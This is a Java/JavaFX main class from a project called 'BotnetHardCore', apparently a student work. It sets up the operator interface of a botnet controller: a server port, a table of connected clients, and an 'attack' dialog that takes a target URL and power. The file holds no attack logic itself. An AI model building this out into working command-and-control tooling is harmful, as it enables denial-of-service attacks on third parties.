package br.com.view;

/**
 * Project: BotnetHardCore
 * ClientTableRow: Jeferson Machado <jefersonmachado@univille.br>
 * Date: 22/07/2018
 * Time: 18:42
 */

import br.com.controller.ClientAttackDialogController;
import br.com.controller.ClientController;
import br.com.core.OnServerCallback;
import br.com.core.Server;
import br.com.model.ClientTableRow;
import javafx.application.Application;
import javafx.application.Platform;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.image.Image;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.BorderPane;
import javafx.stage.Modality;
import javafx.stage.Stage;

import java.io.IOException;

public class MainApp extends Application implements OnServerCallback {

    private Stage mPrimaryStage;
    private BorderPane mRootLayout;
    private ClientController mClientController;

    public static void main(String[] args) {
        launch(args);
    }

    @Override
    public void start(Stage primaryStage) {
        this.mPrimaryStage = primaryStage;
        this.mPrimaryStage.setTitle("BotNet");

        // Set the application icon.
        this.mPrimaryStage.getIcons().add(new Image("file:src/br/com/pricher/server/resources/images/if_trojan.png"));

        primaryStage.setOnCloseRequest(event -> {
            event.consume();
            primaryStage.close();
            Platform.exit();
            System.exit(0);
        });

        initRootLayout();
        loadContent();
    }

    public void startServer(int port) {
        Server.Start(this, port);
    }

    public void stopServer() {
        Server.closeConnections();
    }

    /**
     * Inicializa o root layout (layout base).
     */
    private void initRootLayout() {
        try {
            // Carrega o root layout do arquivo fxml.
            FXMLLoader loader = new FXMLLoader();
            loader.setLocation(MainApp.class.getResource("resource/MainView.fxml"));
            mRootLayout = loader.load();

            // Mostra a scene (cena) contendo o root layout.
            Scene scene = new Scene(mRootLayout);
            mPrimaryStage.setScene(scene);
            mPrimaryStage.show();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void loadContent() {
        try {
            FXMLLoader loader = new FXMLLoader();
            loader.setLocation(MainApp.class.getResource("resource/ContentView.fxml"));
            AnchorPane personOverview = loader.load();

            // Define o person overview dentro do root layout.
            mRootLayout.setCenter(personOverview);

            mClientController = loader.getController();
            mClientController.setMainApp(this);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onClientConnected(ClientTableRow client) {
        mClientController.add(client);
    }

    @Override
    public void onClientDisconnected(ClientTableRow client) {
        mClientController.remove(client);
    }

    @Override
    public void onServerDisconnect() {

    }

    /**
     * Abre uma janela para realizar o ataque no cliente especificado. Se o usuario clicar Abrir, as mudancas sao salvas no objeto client fornecedio e retorna true.
     *
     * @param client O objeto client a ser atacado
     * @return true Se o usuário realizar alguma ativadade ilicita, caso contrario false.
     */
    public boolean showClientAttackDialog(ClientTableRow client) {
        // Mostrar url de destino e potencia
        try {
            // Carrega o arquivo fxml e cria um novo stage para a janela popup
            FXMLLoader loader = new FXMLLoader();
            loader.setLocation(MainApp.class.getResource("resource/ClientAttackDialog.fxml"));
            AnchorPane page = loader.load();

            //Cria o palco dialogStage
            Stage dialogStage = new Stage();
            dialogStage.setTitle("Realize o Ataque");
            dialogStage.initModality(Modality.WINDOW_MODAL);
            dialogStage.initOwner(mPrimaryStage);
            Scene scene = new Scene(page);
            dialogStage.setScene(scene);

            // Define o client no controller.
            ClientAttackDialogController controller = loader.getController();
            controller.setmDialogStage(dialogStage);
            controller.setClient(client);

            //Mostra a janela e espera até o usuario fechar.
            dialogStage.showAndWait();

            return controller.isOkClicked();
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }
}
